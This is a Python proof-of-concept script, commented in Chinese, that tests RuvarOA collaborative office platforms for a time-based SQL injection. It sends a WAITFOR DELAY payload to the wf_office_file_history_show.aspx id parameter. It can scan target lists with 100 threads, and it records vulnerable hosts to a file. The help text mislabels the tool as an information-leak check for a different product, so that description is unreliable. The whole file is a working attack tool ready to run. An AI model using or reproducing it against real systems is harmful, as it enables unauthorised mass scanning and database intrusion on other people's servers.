#RuvarOA协同办公平台 wf_office_file_history_show SQL注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
    # -u指定单个url检测，-f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your attack-url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please input your attack-url.txt')
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    url_payload = '/WorkFlow/wf_office_file_history_show.aspx?id=1%27WAITFOR%20DELAY%20%270:0:5%27-- '
    url = target+url_payload
    headers = {
		"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding":"gzip, deflate",
		"Accept-Language":"zh-CN,zh;q=0.9",
		"sec-ch-ua-platform":'"Windows"',
		"sec-ch-ua":'"Google Chrome";v="115", "Chromium";v="115", "Not=A?Brand";v="24"',
		"sec-ch-ua-mobile":"?0",
		"Connection":"close"
	}
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200:
            res2 = requests.get(url=url,headers=headers,verify=False)
            res3 = requests.get(url=target,headers=headers,verify=False)
            time1 = res2.elapsed.total_seconds()
            time2 = res3.elapsed.total_seconds()
            if time1-time2 >=5:
                print(f"[+] {target} 存在sql延时注入漏洞！")
                with open('result.txt','a') as f:
                    f.write(target+'\n')
            else:
                print(f"[-] {target} 不存在sql延时注入漏洞！")
    
    except Exception:
        print(f'该{target}存在问题，请手动测试')
        

if __name__ == '__main__': # 主函数的入口
    main() # 入口 mian()
